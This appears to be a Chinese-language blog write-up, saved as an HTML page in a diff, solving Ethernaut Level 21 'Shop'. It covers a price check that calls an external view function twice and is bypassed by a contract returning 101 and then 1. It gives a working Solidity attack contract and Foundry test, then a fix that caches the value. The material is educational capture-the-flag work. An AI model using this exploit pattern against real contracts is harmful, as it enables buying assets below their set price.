@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Ethernaut Level 21: Shop - 外部调用状态变化漏洞 - Kent&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>KENT&#39;S BLOG</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  <h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
+<li><a href="/">首页</a></li>
+<li><a href="/archives">文章归档</a></li>
+<li><a href="/categories">分类浏览</a> </li>
+<li><a href="/tags">标签云</a></li>
+</ul>
+<h2 id="Web3-0-专区"><a href="#Web3-0-专区" class="headerlink" title="Web3.0 专区"></a>Web3.0 专区</h2><ul>
+<li><a href="/categories/Dapp">Dapp 开发</a></li>
+<li><a href="/tags/solidity">智能合约</a></li>
+<li><a href="/tags/blockchain">区块链技术</a></li>
+<li><a href="/categories/Web3%E5%AE%89%E5%85%A8">Web3安全</a></li>
+</ul>
+<h2 id="Ethernaut-系列-🛡️"><a href="#Ethernaut-系列-🛡️" class="headerlink" title="Ethernaut 系列 🛡️"></a>Ethernaut 系列 🛡️</h2><ul>
+<li><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列总览</a></li>
+<li><a href="/2025/01/25/foundry-setup-guide/">Foundry 环境搭建</a></li>
+</ul>
+<h3 id="基础攻击篇-1-10"><a href="#基础攻击篇-1-10" class="headerlink" title="基础攻击篇 (1-10)"></a>基础攻击篇 (1-10)</h3><ul>
+<li><a href="/2025/01/25/ethernaut-level-01-fallback/">Level 1: Fallback</a></li>
+<li><a href="/2025/01/25/ethernaut-level-02-fallout/">Level 2: Fallout</a></li>
+<li><a href="/2025/01/25/ethernaut-level-03-coinflip/">Level 3: Coin Flip</a></li>
+<li><a href="/2025/01/25/ethernaut-level-04-telephone/">Level 4: Telephone</a></li>
+<li><a href="/2025/01/25/ethernaut-level-05-token/">Level 5: Token</a></li>
+<li><a href="/2025/01/25/ethernaut-level-06-delegation/">Level 6: Delegation</a></li>
+<li><a href="/2025/01/25/ethernaut-level-07-force/">Level 7: Force</a></li>
+<li><a href="/2025/01/25/ethernaut-level-08-vault/">Level 8: Vault</a></li>
+<li><a href="/2025/01/25/ethernaut-level-09-king/">Level 9: King</a></li>
+<li><a href="/2025/01/25/ethernaut-level-10-reentrancy/">Level 10: Re-entrancy</a></li>
+</ul>
+<h3 id="进阶攻击篇-11-20"><a href="#进阶攻击篇-11-20" class="headerlink" title="进阶攻击篇 (11-20)"></a>进阶攻击篇 (11-20)</h3><ul>
+<li><a href="/2025/01/25/ethernaut-level-11-elevator/">Level 11: Elevator</a></li>
+<li><a href="/2025/01/25/ethernaut-level-12-privacy/">Level 12: Privacy</a></li>
+<li><a href="/2025/01/25/ethernaut-level-13-gatekeeper-one/">Level 13: Gatekeeper One</a></li>
+<li><a href="/2025/01/25/ethernaut-level-14-gatekeeper-two/">Level 14: Gatekeeper Two</a></li>
+<li><a href="/2025/01/25/ethernaut-level-15-naught-coin/">Level 15: Naught Coin</a></li>
+<li><a href="/2025/01/25/ethernaut-level-16-preservation/">Level 16: Preservation</a></li>
+<li><a href="/2025/01/25/ethernaut-level-17-recovery/">Level 17: Recovery</a></li>
+<li><a href="/2025/01/25/ethernaut-level-18-magic-number/">Level 18: Magic Number</a></li>
+<li><a href="/2025/01/25/ethernaut-level-19-alien-codex/">Level 19: Alien Codex</a></li>
+<li><a href="/2025/01/25/ethernaut-level-20-denial/">Level 20: Denial</a></li>
+</ul>
+<h3 id="高级攻击篇-21-25"><a href="#高级攻击篇-21-25" class="headerlink" title="高级攻击篇 (21-25)"></a>高级攻击篇 (21-25)</h3><ul>
+<li><a href="/2025/01/25/ethernaut-level-21-shop/">Level 21: Shop</a></li>
+<li><a href="/2025/01/25/ethernaut-level-22-dex/">Level 22: Dex</a></li>
+<li><a href="/2025/01/25/ethernaut-level-23-dex-two/">Level 23: Dex Two</a></li>
+<li><a href="/2025/01/25/ethernaut-level-24-puzzle-wallet/">Level 24: Puzzle Wallet</a></li>
+<li><a href="/2025/01/25/ethernaut-level-25-motorbike/">Level 25: Motorbike</a></li>
+</ul>
+<h2 id="个人页面"><a href="#个人页面" class="headerlink" title="个人页面"></a>个人页面</h2><ul>
+<li><a href="/about">关于我</a></li>
+<li><a href="/repository">项目展示</a></li>
+<li><a href="/books">书单推荐</a></li>
+<li><a href="/links">友情链接</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h1 id="🎯-Ethernaut-Level-21-Shop-外部调用状态变化漏洞"><a href="#🎯-Ethernaut-Level-21-Shop-外部调用状态变化漏洞" class="headerlink" title="🎯 Ethernaut Level 21: Shop - 外部调用状态变化漏洞"></a>🎯 Ethernaut Level 21: Shop - 外部调用状态变化漏洞</h1><blockquote>
+<p><strong>关卡链接</strong>: <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/level/21">Ethernaut Level 21 - Shop</a><br><strong>攻击类型</strong>: 外部调用状态变化 &#x2F; 伪 <code>view</code> 函数<br><strong>难度</strong>: ⭐⭐☆☆☆</p>
+</blockquote>
+<h2 id="📋-挑战目标"><a href="#📋-挑战目标" class="headerlink" title="📋 挑战目标"></a>📋 挑战目标</h2><p>你需要从 <code>Shop</code> 合约中买下商品。但有一个条件：你必须以低于原价（100）的价格买下它。最终目标是让 <code>price</code> 变量的值小于100，并且 <code>isSold</code> 为 <code>true</code>。</p>
+<p><img src="https://ethernaut.openzeppelin.com/imgs/BigLevel21.svg" alt="Shop Requirements"></p>
+<h2 id="🔍-漏洞分析"><a href="#🔍-漏洞分析" class="headerlink" title="🔍 漏洞分析"></a>🔍 漏洞分析</h2><p>让我们看一下 <code>Shop</code> 合约的 <code>buy()</code> 函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract Shop &#123;</span><br><span class="line">    uint public price = 100;</span><br><span class="line">    bool public isSold;</span><br><span class="line"></span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">            isSold = true;</span><br><span class="line">            price = _buyer.price();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// The interface the buyer must implement</span><br><span class="line">interface Buyer &#123;</span><br><span class="line">    function price() external view returns (uint);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞在于 <code>buy()</code> 函数对外部合约 <code>_buyer</code> 的 <code>price()</code> 函数进行了两次调用：</p>
+<ol>
+<li><strong>第一次调用</strong>: 在 <code>if</code> 条件判断中 <code>_buyer.price() &gt;= price</code>。</li>
+<li><strong>第二次调用</strong>: 在 <code>if</code> 块内部，用于更新 <code>price</code> 变量 <code>price = _buyer.price()</code>。</li>
+</ol>
+<p><code>Buyer</code> 接口将 <code>price()</code> 函数标记为 <code>view</code>，这通常意味着该函数不应改变状态。然而，EVM <strong>并不强制 <code>view</code> 函数不能依赖于状态</strong>。一个外部合约的 <code>view</code> 函数完全可以在两次调用之间返回不同的值，只要它的返回值依赖于某些在两次调用之间发生变化的状态。</p>
+<p>我们的攻击思路如下：</p>
+<ol>
+<li>创建一个攻击合约，实现 <code>Buyer</code> 接口。</li>
+<li>在攻击合约的 <code>price()</code> 函数中加入逻辑：如果 <code>Shop</code> 合约的 <code>isSold</code> 状态为 <code>false</code>，则返回一个大于或等于100的值（例如101），以通过 <code>if</code> 检查。如果 <code>isSold</code> 为 <code>true</code>，则返回一个小于100的值（例如1）。</li>
+<li>当我们调用 <code>buy()</code> 时：<ul>
+<li><code>if</code> 条件检查：<code>isSold</code> 是 <code>false</code>，我们的 <code>price()</code> 返回 <code>101</code>。<code>101 &gt;= 100</code> 为真，检查通过。</li>
+<li>进入 <code>if</code> 块：<code>isSold</code> 被设置为 <code>true</code>。</li>
+<li>更新 <code>price</code>：<code>price = _buyer.price()</code> 被调用。此时 <code>isSold</code> 已经是 <code>true</code>，所以我们的 <code>price()</code> 函数返回 <code>1</code>。<code>Shop</code> 合约的 <code>price</code> 变量被更新为 <code>1</code>。</li>
+</ul>
+</li>
+</ol>
+<p>这样，我们就成功地以低价买下了商品。</p>
+<h2 id="💻-Foundry-实现"><a href="#💻-Foundry-实现" class="headerlink" title="💻 Foundry 实现"></a>💻 Foundry 实现</h2><h3 id="攻击合约代码"><a href="#攻击合约代码" class="headerlink" title="攻击合约代码"></a>攻击合约代码</h3><p>攻击合约实现了 <code>Buyer</code> 接口，其 <code>price()</code> 函数根据 <code>Shop</code> 合约的 <code>isSold</code> 状态返回不同的值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IShop &#123;</span><br><span class="line">    function isSold() external view returns (bool);</span><br><span class="line">    function price() external view returns (uint);</span><br><span class="line">    function buy() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    IShop shop;</span><br><span class="line"></span><br><span class="line">    constructor(address _shopAddress) &#123;</span><br><span class="line">        shop = IShop(_shopAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 这个 price 函数是攻击的核心</span><br><span class="line">    function price() public view returns (uint256) &#123;</span><br><span class="line">        // 如果商品还没卖出，返回高价以通过检查</span><br><span class="line">        // 如果已经卖出（在同一次 buy 调用中），返回低价来更新 price</span><br><span class="line">        if (shop.isSold()) &#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 101;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        shop.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Foundry-测试代码"><a href="#Foundry-测试代码" class="headerlink" title="Foundry 测试代码"></a>Foundry 测试代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: Unlicense</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;src/21_Shop.sol&quot;;</span><br><span class="line"></span><br><span class="line">// Attack contract (as defined above)</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    IShop shop;</span><br><span class="line">    constructor(address _shop) &#123; shop = IShop(_shop); &#125;</span><br><span class="line">    function price() public view returns (uint256) &#123; return shop.isSold() ? 1 : 101; &#125;</span><br><span class="line">    function attack() public &#123; shop.buy(); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ShopTest is Test &#123;</span><br><span class="line">    Shop instance;</span><br><span class="line">    Attack attacker;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        player = vm.addr(1);</span><br><span class="line">        instance = new Shop();</span><br><span class="line">        attacker = new Attack(address(instance));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testAttack() public &#123;</span><br><span class="line">        vm.startPrank(player);</span><br><span class="line">        attacker.attack();</span><br><span class="line">        vm.stopPrank();</span><br><span class="line"></span><br><span class="line">        // 验证攻击是否成功</span><br><span class="line">        assertEq(instance.price(), 1, &quot;Price should be updated to 1&quot;);</span><br><span class="line">        assertTrue(instance.isSold(), &quot;isSold should be true&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="关键攻击步骤"><a href="#关键攻击步骤" class="headerlink" title="关键攻击步骤"></a>关键攻击步骤</h3><ol>
+<li><strong>部署攻击合约</strong>: 创建 <code>Attack</code> 合约，它实现了 <code>Buyer</code> 接口。</li>
+<li><strong>调用 <code>attack()</code></strong>: <code>Attack</code> 合约的 <code>attack()</code> 函数调用 <code>Shop</code> 合约的 <code>buy()</code> 函数。</li>
+<li><strong>双重返回值</strong>: <code>Shop</code> 合约在同一次 <code>buy()</code> 调用中两次调用 <code>Attack</code> 合约的 <code>price()</code> 函数，但由于 <code>Shop</code> 的内部状态 <code>isSold</code> 发生了变化，<code>Attack</code> 的 <code>price()</code> 函数返回了两个不同的值，从而绕过了逻辑检查并以低价成交。</li>
+</ol>
+<h2 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a>🛡️ 防御措施</h2><ol>
+<li><p><strong>不要在一次交易中多次调用外部 <code>view</code> 函数</strong>: 如果必须这样做，请将第一次调用的返回值存储在一个局部变量中，并在后续逻辑中使用这个局部变量，而不是再次进行外部调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 修复建议</span><br><span class="line">function buy() public &#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line">    uint _price = _buyer.price(); // 只调用一次，并将结果存入局部变量</span><br><span class="line"></span><br><span class="line">    if (_price &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">        isSold = true;</span><br><span class="line">        price = _price; // 使用局部变量</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>遵循“检查-生效-交互”模式</strong>: 尽管本例中的交互是一个 <code>view</code> 函数，但它仍然是与外部合约的交互。最佳实践是在所有状态变更（“生效”）之后再进行交互。然而，在本例中，更好的修复方法是缓存返回值。</p>
+</li>
+</ol>
+<h2 id="🔧-相关工具和技术"><a href="#🔧-相关工具和技术" class="headerlink" title="🔧 相关工具和技术"></a>🔧 相关工具和技术</h2><ul>
+<li><strong><code>view</code> 函数的误解</strong>: <code>view</code> 关键字只向编译器承诺该函数不会修改状态。它并不保证函数的返回值是纯粹的或在一次交易中保持不变。</li>
+<li><strong>跨合约调用的状态依赖</strong>: 一个合约的函数可以依赖于另一个合约的状态，这可能导致像本例中这样意想不到的行为。</li>
+<li><strong>Foundry <code>prank</code></strong>: 模拟来自特定地址（<code>player</code> -&gt; <code>attacker</code>）的调用链，是测试此类交互式攻击的理想工具。</li>
+</ul>
+<h2 id="🎯-总结"><a href="#🎯-总结" class="headerlink" title="🎯 总结"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>
+<ul>
+<li>外部 <code>view</code> 函数的返回值不是恒定的，它可以在一次交易的不同阶段发生变化。</li>
+<li>在一次函数执行中多次调用同一个外部 <code>view</code> 函数是一个危险的模式，因为它的返回值可能在你意想不到的时候发生改变。</li>
+</ul>
+<p><strong>攻击向量</strong>:</p>
+<ul>
+<li>设计一个恶意的 <code>view</code> 函数，使其根据目标合约的状态返回不同的值。</li>
+<li>利用目标合约在检查和执行阶段之间状态的变化，来操纵 <code>view</code> 函数的返回值，从而绕过安全检查。</li>
+</ul>
+<p><strong>防御策略</strong>:</p>
+<ul>
+<li>当需要多次使用外部调用的结果时，应将其缓存在一个局部变量中，以确保其在整个函数执行过程中的一致性。</li>
+</ul>
+<h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/latest/contracts.html#view-functions">Solidity Docs: View Functions</a></li>
+<li><a target="_blank" rel="noopener" href="https://swcregistry.io/docs/SWC-113">SWC-113: DoS with Failed Call</a> (虽然不是直接的DoS，但原理相似，都涉及到对外部调用结果的错误处理)</li>
+</ul>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="K"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>Kent</div>
+      <div>2025-09-09</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/">Web3安全</a> <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/">智能合约</a> <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/Ethernaut/">Ethernaut</a>
+
+      <a class="tag-none-link" href="/tags/Ethernaut/" rel="tag">#Ethernaut</a> <a class="tag-none-link" href="/tags/Foundry/" rel="tag">#Foundry</a> <a class="tag-none-link" href="/tags/Reentrancy/" rel="tag">#Reentrancy</a> <a class="tag-none-link" href="/tags/Solidity/" rel="tag">#Solidity</a> <a class="tag-none-link" href="/tags/View-Function/" rel="tag">#View Function</a> <a class="tag-none-link" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag">#智能合约安全</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
